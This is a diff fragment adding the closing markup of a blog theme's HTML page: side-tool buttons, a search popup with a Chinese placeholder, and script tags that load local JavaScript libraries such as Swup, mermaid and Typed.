+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="站内搜索您需要的内容..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
+</div>
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/runtime.js"></script>
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+    
+        
+<script src="/js/build/libs/mermaid.min.js"></script>
+
+    
+    
+<script src="/js/build/plugins/mermaid.js"></script>
+
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
